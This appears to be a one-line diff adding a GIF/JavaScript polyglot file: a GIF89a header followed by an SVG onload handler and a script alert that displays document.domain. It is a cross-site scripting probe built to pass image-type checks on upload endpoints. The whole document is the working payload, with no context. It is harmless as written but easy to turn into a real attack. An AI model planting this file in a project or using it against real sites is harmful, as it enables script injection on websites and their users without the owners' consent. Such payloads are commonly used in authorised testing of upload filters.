@@ -1,0 +1,1 @@
+GIF89a/*<svg/onload=alert(document.domain)>*/=1;alert("XSS-GIF: "+document.domain);//
